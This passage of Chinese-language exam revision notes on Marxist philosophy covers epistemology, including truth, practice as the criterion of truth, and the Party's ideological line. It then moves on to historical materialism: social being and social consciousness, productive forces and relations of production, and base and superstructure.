体的认识能力是无限的，这种性质同客观世界的无限性正好一致。</strong></p><p>认识客体：</p><p>第一、认识客体的含义和构成。认识客体是指人的实践活动和认识活动所指向的对象。构成认识客体的内容主要有<strong>自然客体、社会客体</strong></p><p><strong>和精神客体</strong>。（<strong>精神客体是指成为人们认识对象的精神活动和精神产品</strong>；自然客体指自然界；社会客体指人类社会；）</p><p>第二、认识客体的性质和特点：<strong>认识客体具有客观实在性、对象性</strong>。</p><p>主体和客体的关系:(选择)</p><p>认识的主体和客体是一对矛盾的两个方面，它们之间存在着既对立又统一的辩证关系。二者又是同一的，即相互依存、相互作用，并在一</p><p>定条件下相互转化。具体说来，它们的关系表现如下：</p><p>第一、主体和客体的<strong>实践关系</strong>。它是指主体与客体之间改造和被改造的关系，主体作用于客体，就是对客体的改造，也就是实践。 实践</p><p>关系是一切其他关系的前提和基础，也是主体和客体之间的首要的基本关系，没有实践关系，其他任何关系都无从谈起。</p><p>第二、主体和客体的<strong>认识关系</strong>。它是指主体与客体之间反映和被反映的关系。</p><p>第三、主体和客体的<strong>相互作用</strong>。主体的能动作用，客体的制约作用。</p><p>一切实践只有在主体能动性和客体制约性统一的基础上，才是成功的实践。这个实践过程也是主体客体化和客体主体化的过程。</p><p>3<strong>、马克思主义关于认识的本质及其和唯心主义、不可知论和旧唯物主义在认识本质问题上的区别（三个区别）：</strong></p><p><strong>认识的真正本质是在实践中主体对客体的能动反映，这是马克思主义哲学对认识本质的科学揭示</strong>。马克思主义的认识论同唯心主义认识</p><p>论、不可知论从根本上区别了开来，而且也同旧唯物主义认识论划清了界限。</p><p>第一、<strong>唯物论的反映论与唯心论的认识论的对立</strong>。在哲学上有两条对立的认识路线：一条是从物到感觉和思想的路线；一条是从感觉和</p><p>思想到物的路线。</p><p>一切唯物论的认识论都是反映论，旧唯物主义未能从根本上解决认识的本质问题。</p><p>唯心主义认为同人的直接经验没有任何关系，这就是唯心论的先验论。这种认识论对认识活动进行了很多探索和研究，不可能正确解决认</p><p>识的本质问题。</p><p>第二、<strong>可知论与不可知论的对立。</strong>唯物主义哲学对这个问题的回答都是肯定的，现实世界是可知的。有些唯心主义哲学家，对这个问题</p><p>也给了肯定的回答，如黑格尔。但他同唯物主义所主张的可知论是有根本区别的。</p><p>哲学上的不可知论是指那些认为世界不可认识或不能彻底认识的哲学认识论。在欧洲近代哲学中有两位典型代表人物，一位是英国的休</p><p>谟，另一位是德国哲学家康德。</p><p>不可知论是一种错误的、消极的理论，它怀疑人的认识能力，不承认人类知识的客观性，对人类的进步和发展起着消极的作用。实践的观</p><p>点彻底批驳了不可知论以及哲学上的一切其他怪论。</p><p>第三、<strong>辩证唯物论的能动的反映论与旧唯物论的机械的反映论的对立</strong>。在认识论上，唯物论都是反映论，这种反映论<strong>不懂得实践，不懂</strong></p><p><strong>得辩论法。</strong></p><p>辩证唯物论是对这种唯物论的发展和超越，它把实践观引进到认识论中来，并把认识论与辩证法结合起来，科学地揭示了认识的本质，把</p><p>认识看作是主体在实践中能动的反映客体的过程，从而使得辩证唯物论的反映成为能动的革命的反映论。</p><p><strong>认识的过程是反映与创造的统一，这是辩证唯物论的反映论的能动性的突出表现，也是区别于机械唯物论反映论的根本标志</strong>。</p><p>认识的本质 是在实践基础上主体对客体的能动反映。（唯心主义不承认反映，主张先验论；不可知论不承认能真实反映，主张不可知；</p><p>旧唯物主义不承认是能动反映，主张是直观反映）。</p><p>4<strong>、认识的辩证运动过程</strong> （二次飞跃）：</p><p>第一次是从感性认识到理性认识（或是从实践到认识）两者关系和飞跃的条件：</p><p>感性认识和理性认识的辩证关系（简答题）</p><p>感性认识和理性认识是认识的两个阶段，它们既相互区别、又相互联系，它们之间存在着对立统一的关系。</p><p>第一、感性认识与理性认识的区别。感性认识是对事物表面的、直接的、具体的、个别特性的反映，因而是不深刻的、片面的认识；理性</p><p>认识是对事物本质的、间接的、全体的、概括的反映，因而是深刻的、全面的、相对稳定的认识。</p><p>第二、感性认识与理性认识的联系。表现在以下几个方面：其一、理性认识依赖于感性认识；在认识论上坚持了唯物论。其二、感性认识</p><p>有待于发展到理性认识；认识论上坚持了辩证法。</p><p>其三、感性认识和理性认识相互渗透；一方面，感性认识中有理性认识；另一方面，理性认识中包含感性的成分。在人的实际认识过程中</p><p>既没有纯粹的感性认识，也没有纯粹的理性认识。<strong>感性、理性认识是不可分割的，如果将二者割裂开，就会犯经验论或唯理论的错误</strong>。经验论者片面强调感性经验的重要性、唯理论者则</p><p>走向另一个极端，认为感性经验是靠不住的。都犯了片面性的毛病，都是错误的。<strong>在实际工作中，经验论和唯理论是经验主义和教条主</strong></p><p><strong>义的认识论根源</strong>。</p><p>感性认识向理性认识的飞跃要具备两个条件：第一，必须有正确的思维方法和正确途径。‘去粗取精、去伪存真、由此及彼、由表及</p><p>里’。第二、感性材料应是丰富的、全面的，而不是零散不全的。</p><p>第二次是从理性认识到实践：原因和条件：</p><p>从理性认识到实践（简答题）<strong>认识世界和改造世界的统一是马克思主义哲学的特点和优点。</strong></p><p>实践是认识的目的。实践是经验理性正确与否的唯一标准。</p><p>认识由感性上升到理性，这只是认识运动的一半，还要实现由理性认识向实践的飞跃。</p><p>认识的这次飞跃比第一次飞跃具有更加重大的意义。这是因为：</p><p>第一、只有经过这一次飞跃，才能把理论用于指导实践，实现对客观世界的改造。</p><p>第二、只有经过这一次飞跃，使理性认识再回到实践中去，使之得到检验、丰富和发展。</p><p>认识的辩证运动规律及其意义：</p><p>认识的有限性是指每个时代的人每一次具体的认识是有限的，认识的无限性是指整个人类无止境的世代更替的认识是无限的。每个时代的</p><p>人的每一次具体的认识，由于受主客观条件的限制，都是有限的；整个人类无止境的世代更替的认识，则具有无限性。整个人类认识的无</p><p>限性，存在于每个时代的人认识的有限性中，并通过无数有限性的认识而得到实现。所以认识的有限性和认识的无限性是辩证统一的。</p><p>规律：毛泽东指出：‘实践、认识、再实践、再认识，这种形式，循环往复以至无穷，而实践和认识之每一循环的内容，都比较地进到高</p><p>一级的程度、螺旋式的上升运动，这就是认识运动反正得总规律。</p><p><strong>意义：</strong>首先、主观和客观、认识和实践的统一是<strong>具体的</strong>。这是指特定的主体在具体的实践中的主观认识与特定的客观实际的相一致、相</p><p>符合。（一定时代下）</p><p>其次、主观和客观、认识和实践的统一是<strong>历史的、变化发展的</strong>。这是指认识也实践的统一是变动的，随着实践的发展，认识也应跟着实</p><p>践的发展而发展。（与时俱进）</p><p>5<strong>、马克思主义的真理观</strong></p><p>真理和谬误的辩证关系（内容真理的含义）：</p><p>在实践中，主体对客体的反映有两种情形：一种是主体正确地反映了客体，一种是主体歪曲地反映了客体。正确地反映客体的认识就是真</p><p>理，歪曲地反映客体的认识就是谬误。</p><p>真理和谬误是认识运动中既对立又统一的两个方面。它们的对立表现在相互排斥、相互否定上。 </p><p>真理与谬误的统一表现为它们之间的相互依存和相互转化。</p><p>在一定条件下，可以相互转化。这是因为任何真理都是具体的，都有与之相符的特定的对象、时间、和范围，一旦离开这个对象，超出特</p><p>定的时间和范围，真理就会变成谬误，真理便会变成错误。谬误也可能转化为真理，这是指当人们把超出特定对象、时间和范围的认识进</p><p>行纠正，使之重新与对象、时间和范围相符合，这时谬误就变成了真理。</p><p>真理的客观性及其二点含义：作为正确认识的真理具有多种属性，最重要是真理的客观性、绝对性和相对性。</p><p>真理的客观性（固有规律）；真理的客观性有两个含义：</p><p>其一、真理的客观性就是承认认识的内容来自客观实际又符合客观实际。事物及其规律本身并不就</p><p> 是真理；真理属于认识范围。</p><p>其二、真理的客观性是指检验真理的标准是客观的。验证真理的标准只能是实践。</p><p> 主观的真理是根本不存在的。唯物主义承认客观真理。唯心主义否认客观真理。</p><p>真理的绝对性和真理相对性的辩证关系及其意义（真理的绝对性和相对性是一个真理的两个方面，不是两个不同的真理）：</p><p>真理既是绝对的，又是相对的，是绝对性和相对性的统一。真理的绝对性和相对性具有如下关系：</p><p>第一、真理的绝对性和相对性相互依存。</p><p>第二、真理的绝对性和相对性互相包含、互相渗透：一方面，任何相对真理中都包含着绝对真理的颗粒；另一方面，绝对真理通过相对真</p><p>理表现出来，无数相对真理的总和构成绝对真理。</p><p>第三、相对真理向绝对真理转化。</p><p>真理是绝对的，同时又是相对的，具有相对性，通常把真理的相对性称作“<strong>相对真理</strong>”。真理的相对性有两个含义：第一、真理性的认</p><p>识在<strong>广度</strong>上是有限的，是受一定条件制约的，它需要进一步扩展。第二、真理性的认识在<strong>深度</strong>上是有限的，是受一定条件制约的。</p><p>意义：在哲学上有两种对待二者关系的错误态度，即相对主义和绝对主义。相对主义不承认在相对真理中包含绝对真理的成分和颗粒，实</p><p>际上就是否认客观真理的存在；绝对主义否认真理的相对性，否认真理是一个过程，从而导致把人的认识僵化。都是真理问题上的片面</p><p>性，都是错误的。</p><p>把握真理的绝对性和相对性相统一的原理，对于我们正确对待马克思主义有重要意义。马克思主义是真理，它也是绝对性和相对性的统</p><p>一。它正确地反映了自然、社会和思维发展的普遍规律，因而具有绝对性的一面。但是，它又没有穷尽一切事物及其规律，需要随着社会</p><p>实践的发展而发展，因而又具有相对性的一面。正因为马克思主义真理具有绝对性，所以我们必须坚持它并以它作为我们的指导思想；又</p><p>因为它具有相对性，所以我们又必须在实践中丰富它、发展它。既坚持又发展，才是对待马克思主义的正确态度。</p><p>实践是检验真理的唯一标准真理标准问题上的两种错误观点(选择题)</p><p>第一种，提出用伟人、<strong>圣人之言</strong>作为衡量真理的标准。这些都是主观真理论者在真理标准问题上的表现。第二种，实用主义哲学提出的</p><p>“<strong>有用即真理</strong>”。 是一种非常错误的观点：第一、真理的检验是关于认识与认识对象是不是一致的问题，这与真理是不是具有效用是不</p><p>同的两个问题；第二、真理是有用的，但有用的未必就是真理；第三、会使得真理的标准变得极为不确定，也就失去了标准的意义。</p><p>实践标准唯一性的理由（实践是检验真理的唯一标准是有真理的本性和实践的特点作决定的）：</p><p>马克思主义哲学把实践观引进到认识论中来，提出实践是检验认识是否具有真理性的唯一标准。</p><p>第一、<strong>是不是真理就是要判明认识与认识对象是否相一致、相符合，主观真理论者无例外地都是从主观认识范围去解决这个问题</strong>；而马</p><p>克思主义哲学提出实践标准，实践是人的主观见之于客观的活动，它能把主观认识与客观实际联系起来加以对照，来确定认识与认识对象</p><p>是否相一致、相符合，从而使认识得到检验。</p><p>第二、<strong>唯有实践才具有直接现实性的品格</strong>。通过实践把思想、理论在现实中实现出来，人们通过把变成现实的东西同原来的观念、思想</p><p>加以对照，从而判明这个思想、观念是否正确，使认识得到检验。</p><p>实践标准和逻逻辑证明的关系（实践标准的唯一性和逻辑证明的辅助性）：</p><p>坚持实践是检验真理的唯一标准，并不否认逻辑证明在认识和探索真理中的作用。但逻辑证明的但逻辑证明的这种作用并不表明它是检验</p><p>真理的标准，更不能用逻辑证明取代实践标准。</p><p>实践标准本身的辩证性（确定和不确定的统一）：</p><p><strong>实践标准既是确定的、绝对的</strong>，<strong>又是不确定的、相对的</strong>，<strong>是确定性与不确定性、绝对性与相对性的统一。这就是在真理标准问题上坚持</strong></p><p><strong>了辩证法。</strong></p><p>实践标准的绝对性、确定性是指：</p><p>第一、认识是否是真理，只有通过实践来检验，此外再无别的检验真理的办法。</p><p>第二、人的实践和人的认识都是有限和无限的统一，实践能够对人类的一切认识作出检验。</p><p>实践标准的相对性、不确定性是指：</p><p>第一、任何实践总是一定历史条件下的具体的实践，都是有局限性的，因而它不可能完全证实或驳倒现有的一切认识。</p><p>第二、实践对真理的检验具有反复性。许多认识的真理性往往不是经过实践的一次检验就能被证实或驳倒，而是要经过多次反复检验，才</p><p>能被证实或驳倒。</p><p>真理的价值</p><p>真理和价值的对立和统一关系 ：</p><p>研究认识是否与对象相一致、相符合，这是真理问题；<strong>研究这种相一致、相符合的认识有什么用</strong>，能满足人的什么样需要，这就是<strong>价值</strong></p><p><strong>问题</strong>。真理与价值也是认识过程中必须正确处理的一对矛盾。</p><p>真理与价值的对立是指真理和价值的不同。真理体现的是认识与认识对象的关系，是认识与对象相一致、相符合；<strong>而价值是指外物对人</strong></p><p><strong>需要的满足，表示某物具有对人有用或使人愉快的属性</strong>。由此不难看出，真理和价值是有区别的，不可混为一谈。</p><p>关系：真理与价值又是不可分的，又有统一的一面，表现在：第一、真理能够指导社会实践，人们通过在真理指导下的实践，成功地改造</p><p>世界，以这种实践的成果来满足人的需要，这就是真理所表现出来的价值属性。第二、真理与正确的价值观相一致，正确的价值观是在真</p><p>理指导下形成的。</p><p>真理的功能（三点）：</p><p>第一、真理具有指导实践的功能。第二、真理具有再认识的功能。第三、真理具有教育的功能。具有强大的激励功能。</p><p>6<strong>、马克思主义认识论与党的思想路线的关系</strong></p><p>党的思想路线的内容：</p><p>党的思想路线是一切从实际出发，理论联系实际，实事求是，在实践中检验真理和发展真理。”</p><p>邓小平曾把这一思想路线简要地概括为“实事求是”。<strong>马克思主义哲学认识论</strong>是这条思想路线的理论基础；而<strong>党的思想路线</strong>则是马克思</p><p>主义哲学认识论在实际中的具体运用。</p><p>党的思想路线与马克思主义哲学认识论是统一的，具体表现如下：</p><p>第一、党的思想路线坚持了一切从实际出发的原则。第二、党的思想路线坚持了理论联系实际的原则。第三、“实事求是”是党的思想路</p><p>线的核心，也是马克思主义哲学的精髓，它充分地体现了马克思主义认识论的根本原则。第四、党的思想路线坚持了实践是检验真理的唯</p><p>一标准。党的思想路线是一个整体，是指导我们党各项工作的认识路线。</p><p>马克思主义认识论与党的思想路线的关系：</p><p>我们<strong>党的群众路线</strong>是：一切为了群众，一切依靠群众，从群众中来，到群众中去。马克思主义哲学认识论是群众路线的理论基础。毛泽</p><p>东讲的是群众路线执行的过程，“从群众中来”就是从实践到认识的过程，“到群众中去”就是从认识到实践的过程，“从群众中来，到</p><p>群众中去”不断循环往复的过程，也就是实践—认识—实践不断循环往复的过程，这表明群众路线同马克思主义哲学认识论是完全一致</p><p>的，是马克思主义哲学认识论在实际工作中的运用。在新的历史时期，仍然要坚持党的群众路线。</p><h3 id="第三章-人类社会及其发展规律"><a href="#第三章-人类社会及其发展规律" class="headerlink" title="第三章 人类社会及其发展规律"></a><strong>第三章 人类社会及其发展规律</strong></h3><p>1、<strong>历史观的基本问题</strong> </p><p>是社会存在和社会意识的关系问题（划分历史唯物主义和历史唯心主义的唯一标准）社会存在和社会意识的关系问题之所以是历史观的基本问题，主要是因为：首先，社会存在和社会意识这对范畴，它们包括了人类社会的</p><p>一切物质现象和精神现象。其次，社会存在和社会意识的关系问题，是划分历史唯物主义和历史唯心主义的根本标准。再次，社会存在和</p><p>社会意识的关系问题，也是人们在实践中的重大问题。</p><p>2<strong>、社会存在决定社会意识</strong></p><p>社会存在的三个方面：地理环境、人口因素和生产方式</p><p>地理环境的含义及其在社会发展中的作用和局限性：</p><p>地理环境是指人类生存和发展所依赖的诸种自然条件的总和，它由大气圈、水圈、岩石圈构成，适合生物生存的范围叫生物圈。地理环境</p><p>是人们的物质生活的必要条件之一，地理环境对人类生存的作用有两个方面：第一、地理环境是人类生存的场所。第二、地理环境为人类</p><p>提供生活资料和生产建设的资源。</p><p>地理环境必然影响社会的发展。这种影响作用主要表现在两个方面：第一、地理环境通过对生产的影响，加速或延缓社会的发展。第二、</p><p>地理环境还可以通过对军事、政治的影响，在一定程度上制约不同国家社会的发展。</p><p>地理环境虽然对社会发展起制约和影响作用，但对社会发展不起主要的决定作用。</p><p>人口因素的含义及其在社会发展中的作用和局限性：</p><p>所谓人口因素，是一个包括人口数量、质量、密度、构成、人口的发展、人口分布和迁移、人口的自然变动和社会变动等各种因素的综合</p><p>范畴。</p><p>人口因素对社会发展起着制约和影响作用。主要表现在以下两个方面：第一、一定数量的人口是社会物质生产的必要前提。第二、人口状</p><p>况能加速或延缓社会的发展。</p><p>在社会发展的不同时期，人口状况对社会发展有不同的影响。只有与物质生产相适应的人口状况，才最有利于促进社会的发展。人口因素</p><p>不是社会发展中起决定作用的因素，因为它不能决定社会制度的性质和社会制度的更替，而且它受到物质生产的制约。</p><p>人口问题是我国现代化建设中一个十分严重的问题，突出表现为人口数量多，老龄化趋势和出生婴儿男女比例失调。</p><p>生产方式的定义及其在社会发展中的决定作用表现（四点）简答题：</p><p>生产方式是人类借以向自然界谋取必需的生活资料的方式，包括生产力和生产关系两个方面，是特定的生产力和生产关系的统一。生产方</p><p>式在社会发展中起决定作用，主要表现在以下几个方面：</p><p>第一、生产方式或生产活动是人类从动物界分离出来的根本动力和人类区别于动物的根本标志。</p><p>第二、生产方式或生产活动是人类和人类社会得以存在和发展的基础。</p><p>第三、生产活动是形成人类一切社会关系的基础。在生产关系的基础上，形成了整个人类社会。</p><p>第四、生产方式决定社会制度的性质和社会制度的更替。</p><p>社会意识的含义及其划分：</p><p>社会意识指社会的精神生活过程，它具有复杂而精微的结构，由诸多因素和层次构成。从反映社会存在的程度和特点来看，社会意识包括</p><p>社会心理和思想体系；各种思想体系由于对经济基础的关系不同和反映社会存在的方式不同，可以分为意识形态和非意识形态两类；从社</p><p>会意识主体的范围来看，可以分为个体意识和群体意识</p><p>1．社会心理和思想体系</p><p>社会心理是社会意识的低级层次；思想体系是社会意识的高级层次，亦称社会意识形式。</p><p>2．意识形态和非意识形态</p><p>属于意识形态范围的思想体系，包括政治思想、法律思想、道德、宗教、艺术、哲学和绝大部分社会科学，它们是上层建筑的重要组成部</p><p>分，反映特定的经济基础并为之服务，在阶级社会里具有一定的阶级性。属于非意识形态范围的思想体系，包括自然科学、语言学、逻辑</p><p>学等，它们不是特定经济基础的反映，其自身没有阶级性，可以一视同仁地为各个阶级和各种经济基础服务。</p><p>3．个体意识和群体意识： 个体意识即社会成员的个人意识，群体意识是指各种社会群体的意识。</p><p>社会存在和社会意思的辩证关系：</p><p>所谓社会存在决定社会意识，是指社会意识是社会存在的反映，社会意识依赖于社会存在。主要表现在以下三个方面：</p><p>第一、社会意识的内容来源于社会存在。</p><p>第二、社会意识随着社会存在的发展变化而发展变化。</p><p>第三、社会意识受反映者(意识主体)的立场、观点、方法的影响和制约，而反映者的立场、观点、方法是由人们在社会存在中的地位决定</p><p>的。</p><p>2．社会意识反作用于社会存在</p><p>社会意识对社会存在的反作用，指社会意识这种精神力量，在一定条件下可以反作用于社会存在，转化为物质力量，影响社会发展的进</p><p>程。社会意识对社会存在的反作用<strong>表现为两种情况</strong>：先进的或正确的社会意识对社会存在的发展起积极的推动作用，促进社会向前发</p><p>展；落后的或错误的社会意识对社会存在的发展起消极的阻碍作用，延缓社会的发展进程。社会意识对社会存在的反作用，必须通过人民</p><p>群众的实践活动。</p><p>社会意识相对独立性的含义及其五点表现：</p><p>社会意识的相对独立性是指社会意识在反映社会存在、被社会存在所决定的同时，还具有自身的能动性和独特的发展规律，它的发展与社</p><p>会存在的发展并不总是保持着一致和平衡。社会意识的相对独立性主要表现在以下五个方面：</p><p>第一、社会意识与社会存在变化发展的<strong>非完全同步性</strong>；第二、社会意识与社会经济<strong>发展水平具有不平衡性</strong>；</p><p>第三、社会意识的发展具有<strong>历史继承性</strong>；</p><p>第四、社会意识各种形式之间<strong>相互作用、相互影响</strong>；</p><p>第五、社会意识对社会存在的反作用或称<strong>能动性</strong>，是<strong>社会意识相对独立性的重要表现</strong>。 </p><p>3<strong>、生产力和生产关系的矛盾运动</strong></p><p>生产力的含义及其构成的四类要素：</p><p>生产力是人类利用自然、改造自然、从自然界获取物质资料的能力，<strong>生产力范畴反映的是人与自然界的关系</strong>。<strong>现代生产力系统包括四类</strong></p><p><strong>要素</strong>： </p><p>（1）<strong>独立的实体性因素。包括劳动者、劳动资料和劳动对象</strong>。生产工具是劳动资料的主要内容，是生产力发展水平的主要标志。</p><p>劳动对象分为两大类：一类是天然存在的劳动对象；另一类是经过劳动加工的劳动对象（原料）。劳动资料和劳动对象合称生产资料。</p><p>（2）<strong>运筹性的综合因素，包括分工协作、经济管理、预测决策等</strong>。 </p><p>（3）<strong>渗透性因素，主要指自然科学</strong>。 </p><p>（4）<strong>准备性因素，主要指教育</strong>。</p><p>科学技术是第一生产力的三层含义：</p><p>邓小平提出“科学技术是第一生产力”的著名论断。主要有以下三层含义。</p><p>第一层含义<strong>：</strong>科学渗透于现代生产力系统的各类要素之中。</p><p>第二层含义：在现代化生产中，出现了“科学—技术—生产”的过程，使科学对物质生产具有了主 </p><p> 导作用和超前作用。</p><p>第三层含义：科学技术已经成为推动生产力发展的重大杠杆。首先，由科学技术因素造成的劳动生产率和经济增长率越来越高。其次，自</p><p>然科学从理论突破到新产品试制成功的周期日益缩短。再次，科学技术的广泛应用，使生产力的发展明显地呈现出加速度的趋势。</p><p>生产关系的含义及其包含的三项内容：</p><p>生产关系是指人们在物质生产过程中结成的<strong>经济关系</strong>。它包括三项内容：（1）生产资料的所有制形式；（2）人们在生产中的地位及其</p><p>相互关系（包括交换）；（3）产品的分配方式。</p><p>其中第一项生产资料所有制形式起决定的作用：</p><p>它是整个生产关系的基础，主要表现在以下几个方面：</p><p>第一、生产资料所有制形式是生产劳动得以进行的前提（起决定性的作用）。</p><p>第二、生产资料所有制形式决定整个生产关系的性质。</p><p>第三、生产资料所有制形式决定人们在生产中的地位及其相互关系。</p><p>第四、生产资料所有制形式决定产品的分配方式。</p><p>生产力和生产关系的辩证关系（<strong>生产关系必须适合生产力性质的规律</strong>）：</p><p>生产力决定生产关系，生产关系反作用于生产力，生产力和生产关系之间的矛盾运动，这三项内容构成生产关系必须适合生</p><p>产力性质的规律。</p><p>1．生产力决定生产关系</p><p>生产力和生产关系之间的矛盾是物质生产过程的内部矛盾，<strong>其中生产力是矛盾的主要方面，生产关**</strong>系是矛盾的次要方面**，生产</p><p>力对生产关系起着决定作用、支配作用。这种决定作用表现在以下两个方面：</p><p>第一、生产力的性质决定生产关系的性质。</p><p>第二、生产力的发展决定生产关系的改变。</p><p>2．生产关系反作用于生产力</p><p>生产关系是具有巨大的反作用。这种反作用表现为两种情况：</p><p>第一、适合生产力性质和发展要求的先进的生产关系，促进生产力的发展；</p><p>第二、不适合生产力性质和发展要求的落后的生产关系，阻碍生产力的发展。</p><p>生产力决定生产关系，生产关系反作用于生产力，就是生产力和生产关系的辩证关系。</p><p>3．生产力和生产关系之间的矛盾运动</p><p>生产关系和生产力性质与发展要求之间这种由<strong>基本适合—基本不适合—新的基础上的基本适合</strong>，是一个川流不息、万古常新的循环过</p><p>程，每一次这样的循环，都把人类社会提高到一个新的阶段。</p><p>这条规律的现实意义：</p><p>生产关系必须适合生产力性质的规律，是无产阶级政党制定正确的路线、方针、政策的理论依据。正确理解和运用这个规律，对于我国正</p><p>在进行的改革开放和社会主义现代化建设，具有重大的指导意义。我国社会主义初级阶段实行以公有制为主体、多种所有制经济共同发展</p><p>的基本经济制度，就是以这一规律为理论依据的。</p><p>4<strong>、经济基础和上层建筑的矛盾运动：</strong></p><p>经济基础和上层建筑的含义：经济基础是指一个社会中<strong>占统治地位的生产关系</strong>各个方面的总和，即生产资料所有制形式、各种不同的社会集团在生产中的<strong>地位</strong>及其<strong>相</strong></p><p><strong>互关系</strong>、<strong>产品分配</strong>方式三个方面的总和。</p><p><strong>人类社会有三个基本层次：生产力，生产关系（经济基础），上层建筑。</strong></p><p>上层建筑是与经济基础相对应的范畴，指社会的政治、法律、艺术、道德、宗教、哲学等意识形态以及与这些意识形态相适应的<strong>政治法</strong></p><p><strong>律制度</strong>和<strong>设施的总和</strong>，分为<strong>政治上层建筑</strong>和<strong>观念上层建筑</strong>两部分。</p><p>政治上层建筑与观念上层建筑之间既相互区别，又互相依赖、互相渗透、互相作用、互相转化。首先，<strong>观念上层建筑决定政治上层建</strong></p><p><strong>筑</strong>。其次，<strong>政治上层建筑一旦形成</strong>，又会成为一种强大的、既成的物质力量，<strong>反过来影响观念上层建筑。</strong></p><p>经济基础和上层建筑的辩证关系（上层建筑必须适合经济基础发展要求的规律）：</p><p>上层建筑和经济基础之间这种由基本适合到基本不适合、再到新的基础上的基本适合，是一个川流不息、万古常新的循环过程，而每一次</p><p>这样的循环，都把人类社会推进到一个较高的阶段。</p><p><strong>上层建筑必须适合经济基础发展要求的规律，是无产阶级政党制定正确的路线、方针、政策的理论依据。正确理解和运用这个规律，对</strong></p><p><strong>于我国正在进行的经济体制改革和政治体制改革以及其他方面的改革，具有重大的指导意义</strong>。 </p><p>5<strong>、社会形态划分 及其根源：五种、三种、四种</strong></p><p>社会形态最基本的划分法有两种，一种是<strong>经济</strong>社会形态划分法，另一种是<strong>技术</strong>社会形态划分法。</p><p>五种社会形态划分法：<strong>即原始社会、奴隶社会、封建社会、资本主义社会、共产主义社会（社会主义社会是它的第一阶段</strong>）。</p><p>三种社会形态划分法：<strong>把人类历史划分为人的依赖性社会、物的依赖性社会、个人全面发展的社会</strong>三种依次更替的社会形态。形成<strong>自然</strong></p><p><strong>经济社会、商品经济社会、产品经济社会</strong>在历史上依次更替的三种社会形态。</p><p>技术社会形态划分法：以生产力和技术发展水平以及与此相适应的<strong>产业结构</strong>为标准划分社会形态。技术社会形态就是以生产力和技术发</p><p>展水平以及与此相适应的产业结构为标准划分的社会形态。</p><p><strong>渔猎社会—农业社会—工业社会—信息社会。</strong></p><p>6<strong>、社会形态的发展是一个自然历史的过程：</strong></p><p>社会历史的发展和自然界发展一样，是一个客观的有规律的过程，考察社会历史可以做到和考察自然界那样做到精确（注意：这里的一样</p><p>是指有相同之处，不是指完全相同）</p><p>人类社会的发展或者说社会形态的演变也像自然界一样，是客观的、物质的、辩证的过程，具有不依人的意志为转移的客观规律性。同时</p><p>又应看到，人类的活动是有意识、有目的的。正是人类有意识、有目的的实践活动，构成了人类社会的历史，形成了人类社会历史的发展</p><p>规律。</p><p>社会历史规律不是别的，就是人的活动的规律。“只有把社会关系归结于生产关系，把生产关系归结于生产力的水平，才能有可靠的根据</p><p>把社会形态的发展看作自然历史过程。”（列宁）为什么呢？</p><p>第一、因为每一代人在社会上开始生活时，所遇到的都是现成的生产力和生产关系，任何人都不能自由地选择生产力和生产关系。</p><p>第二、人们不能自由地选择生产力和生产关系，这并不是说他们不可以按照自己的目的和需要去改变原有的生产力和生产关系。</p><p>第三、把社会关系归结于生产关系，把生产关系归结于生产力的水平，就是认为生产力决定生产关系，生产关系作为社会的经济基础又决</p><p>定上层建筑，这是历史发展中的唯物主义因果决定论，或称历史决定论。</p><p>7<strong>、社会历史发展的决定性和选择性的一致及其表现（三点）：</strong></p><p>社会历史发展的决定性是指社会历史有规律性；社会历史发展的选择性是指社会历史发展又是社会主体的人的选择和结果。</p><p>两者的一致性及其表现：</p><p>社会历史发展的决定性是指历史决定论，社会历史发展的选择性是指主体选择的作用。承认历史决定论和承认主体选择的作用是一致的、</p><p>不矛盾的。</p><p>首先，在历史决定论看来，纯粹的必然性只存在于逻辑中。[价格、价值]</p><p>其次，在历史决定论看来，社会规律所揭示的社会过程之间的联系，不是单值对应的线性因果联系，而是多值的、或然的、非线性的因果</p><p>联系。</p><p>再次，每一种可能性的实现，又会有多种多样的形式，即各种具体的模式和途径。</p><p>8<strong>、社会形态发展的统一性和多样性的含义和表现：</strong></p><p>社会形态发展的统一性是指各国发展的普遍性；社会形态发展的多样性是指各国发展的差别性。各自表现：</p><p>社会形态发展的统一性，是指各国历史发展过程所具有的共同性、普遍性。这种统一性表现在纵向和横向两个方面。这种统一性表现在纵</p><p>向和横向两个方面。以五种社会形态划分为例，社会形态发展的纵向统一性。社会形态发展的横向统一性，具有大致相同的生产力发展水</p><p>平，大致相同的生产关系体系，大致相同的上层建筑。</p><p>所谓社会形态发展的统一性，是指各国历史发展过程所具有的共同性、普遍性不同国家和民族的历史发展具有不同的特点，在经济、政</p><p>治、文化发展上都有自己民族的特色，</p><p>社会形态发展的多样性主要表现在以下几个方面：</p><p>第一、处于同一社会形态的不同国家和民族的历史具有各自的特点。</p><p>第二、各个国家在不同的社会形态中所具有的典型意义不同。</p><p>第三、人类社会由较低社会形态向较高社会形态转变时，不同国家和民族采取的过渡形式各有特点。</p><p>第四、有些国家和民族由于特殊的社会历史条件，在社会形态转变过程中，可能超越某一个或某几个社会形态第五、多样性不能否定统一性，统一性不能否定多样性。</p><p>9<strong>、社会发展的动力：</strong></p><p>两对社会基本矛盾的辩证关系及其运动时社会发展的基本动力：</p><p><strong>社会基本矛盾指生产力和生产关系之间的矛盾、经济基础和上层建筑之间的矛盾</strong>(<strong>简答题</strong>)</p><p>两对社会基本矛盾之间的关系:不是互相孤立、平行的，而是相互制约、有主次之分的。</p><p>首先，由于生产力决定生产关系、生产关系作为社会的经济基础又决定社会的上层建筑，所以生产力与生产关系之间的矛盾对于经济基础</p><p>与上层建筑之间的矛盾起着主导作用。上层建筑与经济基础之间的矛盾根源于生产力与生产关系之间的矛盾。</p><p>其次，由于生产关系对生产力有反作用，上层建筑对经济基础有反作用，经济基础是联系上层建筑和生产力的中间环节，所以生产力和生</p><p>产关系之间的矛盾的解决，又有赖于经济基础和上层建筑之间的矛盾的解决。</p><p>上层建筑和经济基础的矛盾的解决，制约着生产力和生产关系之间矛盾的解决。</p><p>基本动力：生产力和生产关系之间的矛盾、经济基础和上层建筑之间的矛盾，存在于一切社会形态之中，贯穿于每一个社会形态的始终；</p><p>这两对矛盾制约和决定着其他各种社会矛盾，决定着整个社会的面貌，决定着社会发展的必然阶段和客观趋势，决定社会形态由低级到高</p><p>级的演进。所以社会基本矛盾是社会发展的基本动力。</p><p>阶级斗争在阶级社会发展中的作用：</p><p>主要表现在两个方面。</p><p>首先，阶级斗争推动社会发展的作用，最明显地表现在社会形态更替的过程中。</p><p>其次，阶级斗争推动社会发展的作用，还表现在同一个社会形态的量变过程中。</p><p>阶级是一个历史范畴，它不是从来就有，也不会永远存在。阶级是生产发展到一定阶段的产物。</p><p>【阶级是生产发展到一定阶段的产物，剩余